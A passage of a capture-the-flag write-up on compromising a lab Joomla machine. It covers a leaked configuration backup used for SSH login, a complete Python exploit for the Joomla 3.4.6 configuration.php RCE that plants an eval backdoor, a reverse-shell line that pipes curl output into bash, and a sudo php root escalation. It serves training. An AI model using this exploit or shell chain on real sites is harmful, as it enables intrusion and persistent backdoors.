src="/assets/img/petShop/7.png" width="600" /></p> <p>Going to the directory <code class="language-plaintext highlighter-rouge">/language/en-GB/en-GB.xml</code> we can see the version of the CMS, now let’s search for public exploits for this version.</p> <p><img src="/assets/img/petShop/8.png" width="600" /></p> <p>We can use <code class="language-plaintext highlighter-rouge">searchsploit</code> to search for exploits and we can find a lot :)</p> <p>There are various ways to solve the machine, an easy one and a not-too-easy one. Let’s first look at the easy way.</p> <p><img src="/assets/img/petShop/9.png" width="600" /></p> <h1 id="easy-way-️">Easy way 🛣️:</h1> <p>Let’s do more enumeration. We can use <a>wfuzz</a> to do fuzzing in the page.</p> <p><img src="/assets/img/petShop/10.png" width="600" /></p> <p>We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information…</p> <p>Ok mmm… Let’s fuzz for file extensions such as backup files: <code class="language-plaintext highlighter-rouge">bak, backup, bck…</code></p> <p><img src="/assets/img/petShop/11.png" width="600" /></p> <p>Wow we can see that there is a configuration file configuration.backup. Let’s view its contents.</p> <p><img src="/assets/img/petShop/12.png" width="600" /></p> <p>The output is ugly so let’s fix it up. Press <code class="language-plaintext highlighter-rouge">ctrl + u</code> to view the source code. This will make the output a lot prettier, and we can see a username and password. :)</p> <p><img src="/assets/img/petShop/13.png" width="600" /></p> <p>Now we can login to the machine with the credentials that we found with: <code class="language-plaintext highlighter-rouge">ssh ron@10.14.0.65</code>, and we are in.</p> <p><img src="/assets/img/petShop/14.png" width="400" /></p> <p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p> <p>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></p> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p> <h1 id="not-too-easy-way-️">Not too easy way 🛣️:</h1> <p>Let’s go back a bit and look the available exploits.</p> <p><img src="/assets/img/petShop/8.png" width="600" /></p> <p>In this case, I am going to use the exploit with the title: <code class="language-plaintext highlighter-rouge">3.4.6 - 'configuration.php' Remote Code Execution</code>. You can find all the technical details <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">here</a>.</p> <p>You can use <code class="language-plaintext highlighter-rouge">searchsploit -x php/webapps/47465.py</code> to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: <code class="language-plaintext highlighter-rouge">searchsploit -m php/webapps/47465.py</code>.</p> <p>If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable.</p> <p><img src="/assets/img/petShop/15.png" width="600" /></p> <p>This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">technical details</a>. But to keep this write-up from getting too long, I’m going to give you my script to exploit it.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/python3

import requests as r, string, random, re, signal, sys
from bs4 import BeautifulSoup

url = "http://10.14.0.65/joomla/"
#PROXS = {"http":"http://127.0.0.1:8080"}
PROXS = {}

def def_handler(sig, num):
	print("\n\nSaliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request
	function = 'assert'
	template = 's:3:"FmF";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
	payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'' + backdoor_param +'\\\'])) eval($_POST[\\\''+backdoor_param+'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
	function_len = len(function)
	final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
	return final

def request(url, payload):
	s = r.Session()
	page = s.get(url + 'index.php/login')
	soup = BeautifulSoup(page.content, "html.parser")

	values = soup.find_all("input")

	csrf = values[-1] # Gets the CSRF token value
	ok = re.findall('name="(.*?)"', str(csrf))
	csrf = ok[0]
	url = url + 'index.php/login?task=user.login'

	return_value = values[-2] # Gets the return value
	ok = re.findall('value="(.*?)"', str(return_value))
	return_value = ok[0]

	user_payload = '\\0\\0\\0' * 9
	inj_object = '";'
	inj_object += payload
	inj_object += 's:6:"return";s:102:' # end the object with the 'return' part
	password_payload = 'AAA' + inj_object

	data = {
		'username':user_payload,
		'password':password_payload,
		'return':return_value,
		csrf:'1'
	}

	s.post(url, proxies=PROXS, data=data)

def ping_backdoor(url, param_name):
	while True:
		command = input("[RCE]~&gt; ")
		res = r.post(url + 'configuration.php', data={param_name:'system(\''+ command +'\');'}) # Here is where the magic happens
		print(res.text)

if __name__ == '__main__':
	backdoor_param = random_string(50) ## Generate a unique string for our payload
	payload = get_backdoor_pay()
	print("[+] Backdoor id: " + backdoor_param)
	request(url, payload)
	print("[+] Backdoor is ready, you can enter now...\n")
	ping_backdoor(url, backdoor_param)
</code></pre></div></div> <p>Now with this, we can execute commands, but this is NOT a full interactive shell yet.</p> <p><img src="/assets/img/petShop/16.png" width="600" /></p> <p>To get an interactive shell, there are a lot of ways to do it, but I’m going to use this one:</p> <p>Create a file with the name <code class="language-plaintext highlighter-rouge">index.html</code>, with this content:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/YOUR_IP_HERE/443 0&gt;&amp;1
</code></pre></div></div> <p>Now use the command: <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code> to put a http server where we are sharing our files.</p> <p>And finally use the command <code class="language-plaintext highlighter-rouge">nc -lvnp 443</code> to listen for our reverse connection from our payload above.</p> <p>Now execute the command: <code class="language-plaintext highlighter-rouge">curl YOUR_IP_HERE | bash</code> this is going to get the content of the file index.html and interpret the content as a bash command.</p> <p><img src="/assets/img/petShop/17.png" width="600" /></p> <p>We can see that we get a shell like <code class="language-plaintext highlighter-rouge">www-data</code> user.</p> <p>Now that we are inside the machine you need to do various things to ensure smooth operation:</p> <ol> <li>-&gt; <code class="language-plaintext highlighter-rouge">script /dev/null -c bash</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">ctrl + z</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">reset xterm</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li> </ol> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code> and if we do <code class="language-plaintext highlighter-rouge">ctrl + c</code> is not going to kill the shell, more info <a href="https://invertebr4do.github.io/tratamiento-de-tty/#">here</a>.</p> <p><img src="/assets/img/petShop/18.png" width="600" /></p> <p>We can see the <code class="language-plaintext highlighter-rouge">configuration.backup</code> file so here we can get the creds of the user ron and we can connect through SSH.</p> <h1 id="privilege-escalation-">Privilege escalation 🚩:</h1> <p>Now that we are inside the machine as the user <code class="language-plaintext highlighter-rouge">ron</code>, we need to enumerate the system to find a way to escalate privileges.</p> <p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the <code class="language-plaintext highlighter-rouge">root</code> user.</p> <p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here</a>.</p> <p><img src="/assets/img/petShop/19.png" width="600" /></p> <p>We can see something interesting, the binary <a>php</a> can be run as the root user.</p> <p>A quick search in Google tells us that we can escalate privileges with it, search in <a href="https://gtfobins.github.io/gtfobins/php/#suid">GTFOBins</a>.</p> <p><img src="/assets/img/petShop/20.png" width="600" /></p> <p>We execute the commands:</p> <p><img src="/assets/img/petShop/21.png" width="600" /></p> <p>And now we are root :)</p> <p>Hope you like it and learn something new :)</p> </div> </div> </div> </section> <style> footer { text-align: center; padding: 20px; /* Optional: Add padding for spacing */ color: #fff; /* Optional: Set text color */ } </style> <footer> <h3>Made with ❤️ by <span style="color: #cf0;">FmF</span></h3> </footer> </body> </html>
